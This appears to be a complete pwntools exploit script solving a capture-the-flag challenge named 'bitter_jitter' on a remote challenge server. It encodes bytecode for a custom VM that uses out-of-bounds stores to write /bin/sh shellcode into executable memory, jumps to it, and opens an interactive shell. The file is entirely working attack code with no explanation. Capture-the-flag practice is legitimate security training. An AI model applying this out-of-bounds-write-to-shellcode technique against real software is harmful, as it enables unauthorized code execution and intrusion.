from pwn import *

exe = ELF("./bitter_jitter", checksec=True)

context.binary = exe

HOST = "bitter-jitter.challs.olicyber.it"
PORT = 38075

gdbscript = """
set follow-fork-mode child
b execute_vm
"""

# args.LOCAL = True
args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process(exe.path)
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

R1 = b"\x01"
DP = b"\x04"

MOV = b"\x04"
STORE_OFF = b"\x08"
CALL = b"\x09"
RET = b"\x0a"
NOP = b"\x0b"
END = b"\x0c"

OFF = 0x3000
FUNC = 64

def call_func(func):
    return CALL + p16(func)

def shellcode():
    return asm(shellcraft.amd64.linux.sh())

def mov(reg, b):
    return MOV + reg + p16(b)
    
def store_off(off):
    return STORE_OFF + p16(off) + R1

def oob_store(data, sum_off=0):
    payload = b""
    
    for i, b in enumerate(data):
        payload += mov(R1, b)
        payload += mov(DP, sum_off + i + 1)
        payload += store_off(0xffff)

    return payload
        
def inject_shellcode():
    payload = oob_store(shellcode(), OFF)
    payload += oob_store(asm(f"jmp $+{OFF}"))
    
    return payload + RET

def main():
    r  = conn()
    
    payload = call_func(FUNC) * 6
    payload = payload.ljust(FUNC, NOP)
    
    payload += inject_shellcode()
    
    r.sendlineafter(b"hex:", payload.hex().encode())
    r.interactive()

if __name__ == "__main__":
    main()
